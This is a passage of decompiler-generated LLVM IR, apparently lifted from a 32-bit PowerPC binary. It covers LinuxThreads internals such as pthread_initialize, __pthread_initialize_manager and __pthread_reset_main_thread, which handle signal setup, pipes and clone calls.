  %v2_10003d549 = call i32 @__libc_write(i32 %v3_10003d28, i32 %v2_10003d48)
  store i32 %v2_10003d549, i32* %r3.global-to-local, align 4
  %v3_10003d5812 = icmp eq i32 %v2_10003d549, -1
  br i1 %v3_10003d5812, label %dec_label_pc_10003d60, label %dec_label_pc_10003d70

dec_label_pc_10003d60:                            ; preds = %dec_label_pc_10003d34, %dec_label_pc_10003d60.dec_label_pc_10003d44_crit_edge
  %v0_10003d60 = call i32 @__errno_location()
  store i32 %v0_10003d60, i32* %r3.global-to-local, align 4
  %v1_10003d64 = inttoptr i32 %v0_10003d60 to i32*
  %v2_10003d64 = load i32, i32* %v1_10003d64, align 4
  %v3_10003d68 = icmp eq i32 %v2_10003d64, 4
  br i1 %v3_10003d68, label %dec_label_pc_10003d60.dec_label_pc_10003d44_crit_edge, label %dec_label_pc_10003d70

dec_label_pc_10003d60.dec_label_pc_10003d44_crit_edge: ; preds = %dec_label_pc_10003d60
  %v3_10003d4c.pre = load i32, i32* @global_var_1002c258.128, align 4
  store i32 %v3_10003d4c.pre, i32* %r3.global-to-local, align 4
  store i32 268451160, i32* @lr, align 4
  %v2_10003d54 = call i32 @__libc_write(i32 %v3_10003d4c.pre, i32 %v2_10003d48)
  store i32 %v2_10003d54, i32* %r3.global-to-local, align 4
  %v3_10003d58 = icmp eq i32 %v2_10003d54, -1
  br i1 %v3_10003d58, label %dec_label_pc_10003d60, label %dec_label_pc_10003d70

dec_label_pc_10003d70:                            ; preds = %dec_label_pc_10003d60, %dec_label_pc_10003d60.dec_label_pc_10003d44_crit_edge, %dec_label_pc_10003d34
  %v0_10003d70 = load i32, i32* @r31, align 4
  store i32 %v0_10003d70, i32* @r3, align 4
  store i32 268451192, i32* @lr, align 4
  %v1_10003d74 = call i32 @suspend(i32 %v0_10003d70)
  store i32 %v1_10003d74, i32* %r3.global-to-local, align 4
  %v3_10003d7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32 -15788) to i32*), align 4
  %v0_10003d80 = load i32, i32* @r31, align 4
  %v4_10003d80 = icmp eq i32 %v0_10003d80, %v3_10003d7c
  br i1 %v4_10003d80, label %dec_label_pc_10003d88, label %dec_label_pc_10003db0

dec_label_pc_10003d88:                            ; preds = %dec_label_pc_10003d70
  %v3_10003d90 = load i32, i32* @global_var_10027c74.129, align 4
  store i32 %v3_10003d90, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10003d9c.130 to i32), i32* @lr, align 4
  %v3_10003d98 = call i32 @waitpid(i32 %v3_10003d90, i32 0, i32 -2147483648)
  store i32 %v3_10003d98, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_1002c32c.131, align 4
  store i32 0, i32* @global_var_1002c330.132, align 4
  br label %dec_label_pc_10003db0

dec_label_pc_10003db0:                            ; preds = %entry.dec_label_pc_10003db0_crit_edge, %dec_label_pc_10003d70, %dec_label_pc_10003d88
  %v0_10003dc0 = phi i32 [ %v0_10003dc0.pre, %entry.dec_label_pc_10003db0_crit_edge ], [ %v1_10003d74, %dec_label_pc_10003d70 ], [ %v3_10003d98, %dec_label_pc_10003d88 ]
  ret i32 %v0_10003dc0

; uselistorder directives
  uselistorder i32 %v2_10003d48, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 9, 8, 7, 6, 3, 2, 0, 1 }
  uselistorder i32 268451160, { 1, 0 }
  uselistorder label %dec_label_pc_10003db0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003d70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003d60, { 1, 0 }
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %v3_10003ddc = load i32, i32* @global_var_1002c258.128, align 4
  %v0_10003de4 = load i32, i32* @r2, align 4
  store i32 %v0_10003de4, i32* @r31, align 4
  store i32 -1, i32* @r28, align 4
  %v3_10003dec = icmp eq i32 %v3_10003ddc, -1
  br i1 %v3_10003dec, label %dec_label_pc_10003e24, label %dec_label_pc_10003df4

dec_label_pc_10003df4:                            ; preds = %entry
  %v3_10003df4 = load i32, i32* @global_var_1002c32c.131, align 4
  store i32 %v3_10003df4, i32* @r3, align 4
  store i32 268451324, i32* @lr, align 4
  %v0_10003df8 = call i32 @free()
  %v3_10003dfc = load i32, i32* @global_var_1002c258.128, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_1002c32c.131, align 4
  store i32 0, i32* @global_var_1002c330.132, align 4
  store i32 268451348, i32* @lr, align 4
  %v1_10003e10 = call i32 @__libc_close(i32 %v3_10003dfc)
  %v3_10003e14 = load i32, i32* @global_var_1002c348.133, align 4
  store i32 268451356, i32* @lr, align 4
  %v1_10003e18 = call i32 @__libc_close(i32 %v3_10003e14)
  %v0_10003e1c = load i32, i32* @r28, align 4
  store i32 %v0_10003e1c, i32* @global_var_1002c258.128, align 4
  store i32 %v0_10003e1c, i32* @global_var_1002c348.133, align 4
  br label %dec_label_pc_10003e24

dec_label_pc_10003e24:                            ; preds = %entry, %dec_label_pc_10003df4
  store i32 268451368, i32* @lr, align 4
  %v0_10003e24 = call i32 @__libc_getpid()
  %v1_10003e2c = load i32, i32* @r31, align 4
  %v2_10003e2c = add i32 %v1_10003e2c, 20
  %v3_10003e2c = inttoptr i32 %v2_10003e2c to i32*
  store i32 %v0_10003e24, i32* %v3_10003e2c, align 4
  %v0_10003e30 = load i32, i32* @r31, align 4
  store i32 %v0_10003e30, i32* @global_var_1002c254, align 4
  store i32 ptrtoint (i32* @global_var_1002c37c.134 to i32), i32* %r9.global-to-local, align 4
  %v2_10003e3c = inttoptr i32 %v0_10003e30 to i32*
  store i32 %v0_10003e30, i32* %v2_10003e3c, align 4
  %v0_10003e40 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003e40 = load i32, i32* @r31, align 4
  %v2_10003e40 = add i32 %v1_10003e40, 76
  %v3_10003e40 = inttoptr i32 %v2_10003e40 to i32*
  store i32 %v0_10003e40, i32* %v3_10003e40, align 4
  store i32 ptrtoint (i32* @global_var_1002c378.135 to i32), i32* %r9.global-to-local, align 4
  %v0_10003e4c = load i32, i32* @r31, align 4
  %v2_10003e4c = add i32 %v0_10003e4c, 4
  %v3_10003e4c = inttoptr i32 %v2_10003e4c to i32*
  store i32 %v0_10003e4c, i32* %v3_10003e4c, align 4
  %v0_10003e50 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003e50 = load i32, i32* @r31, align 4
  %v2_10003e50 = add i32 %v1_10003e50, 68
  %v3_10003e50 = inttoptr i32 %v2_10003e50 to i32*
  store i32 %v0_10003e50, i32* %v3_10003e50, align 4
  ret i32 %v0_10003e24

; uselistorder directives
  uselistorder i32 %v0_10003e4c, { 1, 0 }
  uselistorder i32 %v0_10003e30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003e24, { 1, 0 }
}

define i32 @__pthread_kill_other_threads_np() local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  store i32 268451460, i32* @lr, align 4
  %v2_10003e80 = call i32 @pthread_onexit_process(i32 0, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_10003e88.136 to i32), i32* @lr, align 4
  %v0_10003e84 = call i32 @__pthread_reset_main_thread()
  %v2_10003e88 = ptrtoint i32* %stack_var_-164 to i32
  store i32 268451472, i32* @lr, align 4
  %v1_10003e8c = call i32 @sigemptyset(i32 %v2_10003e88)
  %v3_10003e98 = load i32, i32* @global_var_1002c278.125, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 268451508, i32* @lr, align 4
  %v4_10003eb0 = call i32 @__libc_sigaction(i32 %v3_10003e98, i32* nonnull %stack_var_-168, i32 0)
  %v3_10003ebc = load i32, i32* @global_var_1002c27c.137, align 4
  store i32 268451528, i32* @lr, align 4
  %v4_10003ec4 = call i32 @__libc_sigaction(i32 %v3_10003ebc, i32* nonnull %stack_var_-168, i32 0)
  %v3_10003ecc = load i32, i32* @global_var_1002c280.138, align 4
  %tmp7 = icmp slt i32 %v3_10003ecc, 1
  br i1 %tmp7, label %dec_label_pc_10003ee4, label %dec_label_pc_10003ee0

dec_label_pc_10003ee0:                            ; preds = %entry
  store i32 268451556, i32* @lr, align 4
  %v4_10003ee0 = call i32 @__libc_sigaction(i32 %v3_10003ecc, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_10003ee4

dec_label_pc_10003ee4:                            ; preds = %entry, %dec_label_pc_10003ee0
  %v0_10003ef4 = phi i32 [ %v3_10003ecc, %entry ], [ %v4_10003ee0, %dec_label_pc_10003ee0 ]
  ret i32 %v0_10003ef4

; uselistorder directives
  uselistorder i32 ()* @__pthread_reset_main_thread, { 1, 0 }
  uselistorder label %dec_label_pc_10003ee4, { 1, 0 }
}

define i32 @pthread_initialize(i32 %arg1) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-4194624 = alloca i32, align 4
  %v3_10003f0c = load i32, i32* @global_var_1002c328.139, align 4
  store i32 %v3_10003f0c, i32* @r31, align 4
  %v3_10003f10 = icmp eq i32 %v3_10003f0c, 0
  br i1 %v3_10003f10, label %dec_label_pc_10003f18, label %dec_label_pc_100040b4

dec_label_pc_10003f18:                            ; preds = %entry
  %v2_10003f18 = ptrtoint i32* %stack_var_-4194624 to i32
  %v1_10003f1c = call i32 @__asm_rlwinm(i32 %v2_10003f18, i32 0, i32 0, i32 10)
  store i32 %v1_10003f1c, i32* @global_var_1002c328.139, align 4
  store i32 268451624, i32* @lr, align 4
  %v0_10003f24 = call i32 @__libc_getpid()
  %v3_10003f30 = load i32, i32* bitcast (i32** @global_var_1002c2bc.141 to i32*), align 4
  store i32 %v3_10003f30, i32* %r29.global-to-local, align 4
  %v0_10003f3c = load i32, i32* @r31, align 4
  store i32 %v0_10003f3c, i32* @global_var_1002c2c0.142, align 4
  store i32 ptrtoint (i32* @global_var_10027a80 to i32), i32* @r2, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002c378.135 to i32), i32* bitcast (i32** @global_var_10027ac4.143 to i32*), align 4
  store i32 %v0_10003f24, i32* @global_var_10027a94.144, align 4
  store i32 ptrtoint (i32* @global_var_1002c37c.134 to i32), i32* bitcast (i32** @global_var_10027acc.145 to i32*), align 4
  %v3_10003f7c4 = icmp eq i32 %v3_10003f30, 0
  br i1 %v3_10003f7c4, label %dec_label_pc_10003f84, label %dec_label_pc_10003f68

dec_label_pc_10003f68:                            ; preds = %dec_label_pc_10003f18, %dec_label_pc_10003f78
  %v1_10003f74 = phi i32 [ %v3_10003f78, %dec_label_pc_10003f78 ], [ %v3_10003f30, %dec_label_pc_10003f18 ]
  %v1_10003f68 = add i32 %v1_10003f74, 52
  %v2_10003f68 = inttoptr i32 %v1_10003f68 to i32*
  %v3_10003f68 = load i32, i32* %v2_10003f68, align 4
  %v3_10003f6c = icmp eq i32 %v3_10003f68, 1
  br i1 %v3_10003f6c, label %dec_label_pc_10003f78, label %dec_label_pc_10003f74

dec_label_pc_10003f74:                            ; preds = %dec_label_pc_10003f68
  %v0_10003f74 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10003f74, i32* %v2_10003f68, align 4
  %v0_10003f78.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10003f78

dec_label_pc_10003f78:                            ; preds = %dec_label_pc_10003f68, %dec_label_pc_10003f74
  %v0_10003f78 = phi i32 [ %v1_10003f74, %dec_label_pc_10003f68 ], [ %v0_10003f78.pre, %dec_label_pc_10003f74 ]
  %v1_10003f78 = add i32 %v0_10003f78, 32
  %v2_10003f78 = inttoptr i32 %v1_10003f78 to i32*
  %v3_10003f78 = load i32, i32* %v2_10003f78, align 4
  store i32 %v3_10003f78, i32* %r29.global-to-local, align 4
  %v3_10003f7c = icmp eq i32 %v3_10003f78, 0
  br i1 %v3_10003f7c, label %dec_label_pc_10003f7c.dec_label_pc_10003f84_crit_edge, label %dec_label_pc_10003f68

dec_label_pc_10003f7c.dec_label_pc_10003f84_crit_edge: ; preds = %dec_label_pc_10003f78
  br label %dec_label_pc_10003f84

dec_label_pc_10003f84:                            ; preds = %dec_label_pc_10003f7c.dec_label_pc_10003f84_crit_edge, %dec_label_pc_10003f18
  %v2_10003f84 = ptrtoint i32* %stack_var_-312 to i32
  store i32 ptrtoint (i32* @global_var_10003f94.146 to i32), i32* @lr, align 4
  %v2_10003f90 = call i32 @getrlimit(i32 3, i32 %v2_10003f84)
  store i32 ptrtoint (i32* @global_var_10003f98.147 to i32), i32* @lr, align 4
  %v0_10003f94 = call i32 @__GI_getpagesize()
  %tmp = mul i32 %v0_10003f94, -2
  %v2_10003fa0 = add i32 %tmp, 2097152
  %v3_10003fa4 = load i32, i32* %stack_var_-312, align 4
  %v3_10003fa8 = icmp ugt i32 %v3_10003fa4, %v2_10003fa0
  br i1 %v3_10003fa8, label %dec_label_pc_10003fb0, label %dec_label_pc_10003fc0

dec_label_pc_10003fb0:                            ; preds = %dec_label_pc_10003f84
  store i32 %v2_10003fa0, i32* %stack_var_-312, align 4
  store i32 268451776, i32* @lr, align 4
  %v3_10003fbc = call i32 @__GI_setrlimit(i32 3, i32 %v2_10003f84, i32 %v2_10003fa0)
  br label %dec_label_pc_10003fc0

dec_label_pc_10003fc0:                            ; preds = %dec_label_pc_10003f84, %dec_label_pc_10003fb0
  %v2_10003fc0 = ptrtoint i32* %stack_var_-172 to i32
  store i32 268453164, i32* %stack_var_-176, align 4
  store i32 268451804, i32* @lr, align 4
  %v1_10003fd8 = call i32 @sigemptyset(i32 %v2_10003fc0)
  %v3_10003fdc = load i32, i32* @global_var_1002c278.125, align 4
  store i32 268451828, i32* @lr, align 4
  %v4_10003ff0 = call i32 @__libc_sigaction(i32 %v3_10003fdc, i32* nonnull %stack_var_-176, i32 0)
  %v3_10003ff4 = load i32, i32* @global_var_1002c278.125, align 4
  store i32 %v2_10003fc0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r27, align 4
  store i32 268452872, i32* %stack_var_-176, align 4
  store i32 268451856, i32* @lr, align 4
  %v2_1000400c = call i32 @__GI_sigaddset(i32 %v2_10003fc0, i32 %v3_10003ff4)
  %v3_10004010 = load i32, i32* @global_var_1002c27c.137, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r29.global-to-local, align 4
  store i32 268451876, i32* @lr, align 4
  %v4_10004020 = call i32 @__libc_sigaction(i32 %v3_10004010, i32* nonnull %stack_var_-176, i32 0)
  %v3_10004024 = load i32, i32* @global_var_1002c280.138, align 4
  %tmp15 = icmp slt i32 %v3_10004024, 1
  br i1 %tmp15, label %dec_label_pc_10004054, label %dec_label_pc_10004030

dec_label_pc_10004030:                            ; preds = %dec_label_pc_10003fc0
  store i32 268450608, i32* %stack_var_-176, align 4
  store i32 268451908, i32* @lr, align 4
  %v1_10004040 = call i32 @sigemptyset(i32 %v2_10003fc0)
  %v3_10004044 = load i32, i32* @global_var_1002c280.138, align 4
  store i32 268451924, i32* @lr, align 4
  %v4_10004050 = call i32 @__libc_sigaction(i32 %v3_10004044, i32* nonnull %stack_var_-176, i32 0)
  br label %dec_label_pc_10004054

dec_label_pc_10004054:                            ; preds = %dec_label_pc_10003fc0, %dec_label_pc_10004030
  %v2_10004054 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_10004054, i32* %r29.global-to-local, align 4
  store i32 268451936, i32* @lr, align 4
  %v1_1000405c = call i32 @sigemptyset(i32 %v2_10004054)
  %v3_10004060 = load i32, i32* @global_var_1002c278.125, align 4
  store i32 %v2_10004054, i32* @r3, align 4
  store i32 268451948, i32* @lr, align 4
  %v2_10004068 = call i32 @__GI_sigaddset(i32 %v2_10004054, i32 %v3_10004060)
  store i32 268451964, i32* @lr, align 4
  %v3_10004078 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_10004054, i32 0)
  store i32 %v2_10004054, i32* @r3, align 4
  store i32 268451976, i32* @lr, align 4
  %v1_10004084 = call i32 @__GI_sigdelset(i32 %v2_10004054)
  %v3_10004088 = load i32, i32* @global_var_1002c27c.137, align 4
  store i32 %v2_10004054, i32* @r3, align 4
  store i32 268451988, i32* @lr, align 4
  %v2_10004090 = call i32 @__GI_sigaddset(i32 %v2_10004054, i32 %v3_10004088)
  store i32 268452004, i32* @lr, align 4
  %v3_100040a0 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_10004054, i32 0)
  store i32 268452020, i32* @lr, align 4
  %v2_100040b0 = call i32 @on_exit(i32 268451088, i32 0)
  br label %dec_label_pc_100040b4

dec_label_pc_100040b4:                            ; preds = %entry, %dec_label_pc_10004054
  %.0 = phi i32 [ %v2_100040b0, %dec_label_pc_10004054 ], [ undef, %entry ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_10004054, { 0, 2, 1, 4, 3, 5, 7, 6, 8, 9 }
  uselistorder i32 %v2_10003fc0, { 0, 2, 1, 3 }
  uselistorder i32 %v2_10003fa0, { 1, 2, 0 }
  uselistorder i32 %v3_10003f78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32* @global_var_1002c378.135, { 1, 0 }
  uselistorder label %dec_label_pc_100040b4, { 1, 0 }
  uselistorder label %dec_label_pc_10004054, { 1, 0 }
  uselistorder label %dec_label_pc_10003fc0, { 1, 0 }
  uselistorder label %dec_label_pc_10003f78, { 1, 0 }
  uselistorder label %dec_label_pc_10003f68, { 1, 0 }
}

define i32 @__pthread_initialize_manager(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v3_100040e0 = load i32, i32* @global_var_1002c33c.148, align 4
  %v2_100040e4 = inttoptr i32 %v3_100040e0 to i32*
  store i32 1, i32* %v2_100040e4, align 4
  %v3_100040ec = load i32, i32* @global_var_1002c328.139, align 4
  %v3_100040f0 = icmp eq i32 %v3_100040ec, 0
  br i1 %v3_100040f0, label %dec_label_pc_100040f8, label %dec_label_pc_100040fc

dec_label_pc_100040f8:                            ; preds = %entry
  store i32 268452092, i32* @lr, align 4
  %v1_100040f8 = call i32 @pthread_initialize(i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  br label %dec_label_pc_100040fc

dec_label_pc_100040fc:                            ; preds = %entry, %dec_label_pc_100040f8
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r30.global-to-local, align 4
  %v3_10004104 = load i32, i32* @global_var_1002c39c.149, align 4
  %v1_10004108 = mul i32 %v3_10004104, 2
  %v1_1000410c = add i32 %v1_10004108, -32
  store i32 %v1_1000410c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10004114.150 to i32), i32* @lr, align 4
  %v0_10004110 = call i32 @malloc()
  %v3_10004118 = icmp eq i32 %v0_10004110, 0
  store i32 %v0_10004110, i32* @global_var_1002c32c.131, align 4
  br i1 %v3_10004118, label %dec_label_pc_100042ec, label %dec_label_pc_10004124

dec_label_pc_10004124:                            ; preds = %dec_label_pc_100040fc
  %v3_10004124 = load i32, i32* @global_var_1002c39c.149, align 4
  %v1_1000412c = mul i32 %v3_10004124, 2
  %v2_10004134 = ptrtoint i32* %stack_var_-184 to i32
  %v2_10004130 = add i32 %v0_10004110, -32
  %v1_10004138 = add i32 %v2_10004130, %v1_1000412c
  store i32 %v1_10004138, i32* @global_var_1002c330.132, align 4
  store i32 268452164, i32* @lr, align 4
  %v2_10004140 = call i32 @__GI_pipe(i32 %v2_10004134, i32 %v1_10004138)
  %v3_10004144 = icmp eq i32 %v2_10004140, -1
  br i1 %v3_10004144, label %dec_label_pc_1000414c, label %dec_label_pc_10004158

dec_label_pc_1000414c:                            ; preds = %dec_label_pc_10004124
  %v3_1000414c = load i32, i32* @global_var_1002c32c.131, align 4
  store i32 %v3_1000414c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10004154.151 to i32), i32* @lr, align 4
  %v0_10004150 = call i32 @free()
  br label %dec_label_pc_10004254

dec_label_pc_10004158:                            ; preds = %dec_label_pc_10004124
  %v3_1000415c = load i32, i32* @global_var_1002c344.152, align 4
  %v3_10004160 = icmp eq i32 %v3_1000415c, 0
  br i1 %v3_10004160, label %dec_label_pc_10004170thread-pre-split, label %dec_label_pc_10004168

dec_label_pc_10004168:                            ; preds = %dec_label_pc_10004158
  store i32 %v3_1000415c, i32* @global_var_10027c1c.153, align 4
  br label %dec_label_pc_10004170

dec_label_pc_10004170thread-pre-split:            ; preds = %dec_label_pc_10004158
  %v3_10004178.pr = load i32, i32* @global_var_10027c1c.153, align 4
  br label %dec_label_pc_10004170

dec_label_pc_10004170:                            ; preds = %dec_label_pc_10004170thread-pre-split, %dec_label_pc_10004168
  %v3_10004178 = phi i32 [ %v3_10004178.pr, %dec_label_pc_10004170thread-pre-split ], [ %v3_1000415c, %dec_label_pc_10004168 ]
  %v3_1000417c = icmp eq i32 %v3_10004178, 0
  br i1 %v3_1000417c, label %dec_label_pc_1000420c, label %dec_label_pc_10004184

dec_label_pc_10004184:                            ; preds = %dec_label_pc_10004170
  %v3_10004188 = load i32, i32* @global_var_1002c35c.154, align 4
  %v3_1000418c = load i32, i32* @global_var_10027c20.155, align 4
  %v2_10004190 = or i32 %v3_1000418c, %v3_10004188
  %v1_10004194 = and i32 %v2_10004190, 128
  %v3_10004194 = icmp eq i32 %v1_10004194, 0
  br i1 %v3_10004194, label %dec_label_pc_1000420c, label %dec_label_pc_1000419c

dec_label_pc_1000419c:                            ; preds = %dec_label_pc_10004184
  store i32 0, i32* @r4, align 4
  %v3_100041a8 = load i32, i32* bitcast (i32** @global_var_10027c7c.158 to i32*), align 4
  store i32 %v3_100041a8, i32* @r3, align 4
  store i32 268452272, i32* @lr, align 4
  %v0_100041ac = call i32 @__pthread_lock()
  %v3_100041b0 = load i32, i32* @global_var_1002c330.132, align 4
  %v3_100041b4 = load i32, i32* %stack_var_-184, align 4
  store i32 268452300, i32* @lr, align 4
  %v4_100041c8 = call i32 @clone(i32 268461312, i32 %v3_100041b0, i32 3840, i32 %v3_100041b4)
  store i32 %v4_100041c8, i32* @r3, align 4
  %v3_100041cc = icmp eq i32 %v4_100041c8, -1
  store i32 %v4_100041c8, i32* %r30.global-to-local, align 4
  br i1 %v3_100041cc, label %dec_label_pc_100041fc, label %dec_label_pc_100041d8

dec_label_pc_100041d8:                            ; preds = %dec_label_pc_1000419c
  %v0_100041dc = load i32, i32* @r31, align 4
  store i32 %v0_100041dc, i32* @global_var_10027e0c.159, align 4
  store i32 8, i32* @global_var_10027e08.160, align 4
  store i32 2049, i32* @global_var_10027c70.161, align 4
  store i32 %v4_100041c8, i32* @global_var_10027c74.129, align 4
  store i32 %v0_100041dc, i32* @global_var_1002c364.162, align 4
  %v1_100041f8 = call i32 @__linuxthreads_create_event(i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  br label %dec_label_pc_100041fc

dec_label_pc_100041fc:                            ; preds = %dec_label_pc_1000419c, %dec_label_pc_100041d8
  %v3_100041fc = load i32, i32* bitcast (i32** @global_var_10027c7c.158 to i32*), align 4
  store i32 %v3_100041fc, i32* @r3, align 4
  store i32 268452356, i32* @lr, align 4
  %v0_10004200 = call i32 @__pthread_unlock()
  %v0_10004204 = load i32, i32* %r30.global-to-local, align 4
  %v3_10004204 = icmp eq i32 %v0_10004204, 0
  br i1 %v3_10004204, label %dec_label_pc_1000420c, label %dec_label_pc_10004230

dec_label_pc_1000420c:                            ; preds = %dec_label_pc_100041fc, %dec_label_pc_10004184, %dec_label_pc_10004170
  %v3_10004210 = load i32, i32* %stack_var_-184, align 4
  %v3_10004214 = load i32, i32* @global_var_1002c330.132, align 4
  store i32 268452396, i32* @lr, align 4
  %v4_10004228 = call i32 @clone(i32 268459564, i32 %v3_10004214, i32 3840, i32 %v3_10004210)
  store i32 %v4_10004228, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10004230

dec_label_pc_10004230:                            ; preds = %dec_label_pc_100041fc, %dec_label_pc_1000420c
  %v0_10004278 = phi i32 [ %v4_10004228, %dec_label_pc_1000420c ], [ %v0_10004204, %dec_label_pc_100041fc ]
  %v3_10004230 = icmp eq i32 %v0_10004278, -1
  br i1 %v3_10004230, label %dec_label_pc_10004238, label %dec_label_pc_1000425c

dec_label_pc_10004238:                            ; preds = %dec_label_pc_10004230
  %v3_1000423c = load i32, i32* @global_var_1002c32c.131, align 4
  store i32 %v3_1000423c, i32* @r3, align 4
  store i32 268452420, i32* @lr, align 4
  %v0_10004240 = call i32 @free()
  %v3_10004244 = load i32, i32* %stack_var_-184, align 4
  store i32 268452428, i32* @lr, align 4
  %v1_10004248 = call i32 @__libc_close(i32 %v3_10004244)
  store i32 ptrtoint (i32* @global_var_10004254.163 to i32), i32* @lr, align 4
  %v1_10004250 = call i32 @__libc_close(i32 %tmp2)
  br label %dec_label_pc_10004254

dec_label_pc_10004254:                            ; preds = %dec_label_pc_1000414c, %dec_label_pc_10004238
  br label %dec_label_pc_100042ec

dec_label_pc_1000425c:                            ; preds = %dec_label_pc_10004230
  %v3_10004264 = load i32, i32* @global_var_1002c368.164, align 4
  %v3_10004270 = icmp eq i32 %v3_10004264, 0
  store i32 %v0_10004278, i32* @global_var_10027c74.129, align 4
  store i32 %tmp2, i32* @global_var_1002c258.128, align 4
  %v3_10004284 = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_10004284, i32* @global_var_1002c348.133, align 4
  store i32 2049, i32* @global_var_10027c70.161, align 4
  br i1 %v3_10004270, label %dec_label_pc_100042b4, label %dec_label_pc_10004298

dec_label_pc_10004298:                            ; preds = %dec_label_pc_1000425c
  %v3_1000429c = load i32, i32* @global_var_1002c280.138, align 4
  %tmp8 = icmp slt i32 %v3_1000429c, 1
  br i1 %tmp8, label %dec_label_pc_100042b4, label %dec_label_pc_100042a8

dec_label_pc_100042a8:                            ; preds = %dec_label_pc_10004298
  store i32 268452524, i32* @lr, align 4
  %v1_100042a8 = call i32 @__GI_raise(i32 %v3_1000429c)
  %v0_100042ac = load i32, i32* @r2, align 4
  store i32 %v0_100042ac, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100042b4.165 to i32), i32* @lr, align 4
  %v0_100042b0 = call i32 @__pthread_wait_for_restart_signal()
  br label %dec_label_pc_100042b4

dec_label_pc_100042b4:                            ; preds = %dec_label_pc_10004298, %dec_label_pc_1000425c, %dec_label_pc_100042a8
  %v2_100042c0 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_100042bc

dec_label_pc_100042bc:                            ; preds = %dec_label_pc_100042d8, %dec_label_pc_100042b4
  %v3_100042c4 = load i32, i32* @global_var_1002c258.128, align 4
  store i32 268452560, i32* @lr, align 4
  %v2_100042cc = call i32 @__libc_write(i32 %v3_100042c4, i32 %v2_100042c0)
  %v3_100042d0 = icmp eq i32 %v2_100042cc, -1
  br i1 %v3_100042d0, label %dec_label_pc_100042d8, label %dec_label_pc_100042e8

dec_label_pc_100042d8:                            ; preds = %dec_label_pc_100042bc
  %v0_100042d8 = call i32 @__errno_location()
  %v1_100042dc = inttoptr i32 %v0_100042d8 to i32*
  %v2_100042dc = load i32, i32* %v1_100042dc, align 4
  %v3_100042e0 = icmp eq i32 %v2_100042dc, 4
  br i1 %v3_100042e0, label %dec_label_pc_100042bc, label %dec_label_pc_100042e8

dec_label_pc_100042e8:                            ; preds = %dec_label_pc_100042bc, %dec_label_pc_100042d8
  br label %dec_label_pc_100042ec

dec_label_pc_100042ec:                            ; preds = %dec_label_pc_100040fc, %dec_label_pc_10004254, %dec_label_pc_100042e8
  %v0_100042ec = phi i32 [ -1, %dec_label_pc_100040fc ], [ -1, %dec_label_pc_10004254 ], [ 0, %dec_label_pc_100042e8 ]
  ret i32 %v0_100042ec

; uselistorder directives
  uselistorder i32 %v3_1000415c, { 1, 0, 2 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder label %dec_label_pc_100042ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100042e8, { 1, 0 }
  uselistorder label %dec_label_pc_100042b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004254, { 1, 0 }
  uselistorder label %dec_label_pc_10004230, { 1, 0 }
  uselistorder label %dec_label_pc_100041fc, { 1, 0 }
  uselistorder label %dec_label_pc_100040fc, { 1, 0 }
}

define i32 @__pthread_initialize() local_unnamed_addr {
entry:
  %v0_10004304 = load i32, i32* @r3, align 4
  %v1_10004304 = call i32 @pthread_initialize(i32 %v0_10004304)
  ret i32 %v1_10004304

; uselistorder directives
  uselistorder i32 (i32)* @pthread_initialize, { 1, 0 }
}

define i32 @__pthread_initialize_minimal(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10027a80 to i32), i32* @r2, align 4
  %v2_10004320 = call i32 @__libc_pthread_init(i32 0, i32 268566528)
  store i32 %v2_10004320, i32* @global_var_1002c33c.148, align 4
  ret i32 %v2_10004320
}

define i32 @pthread_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
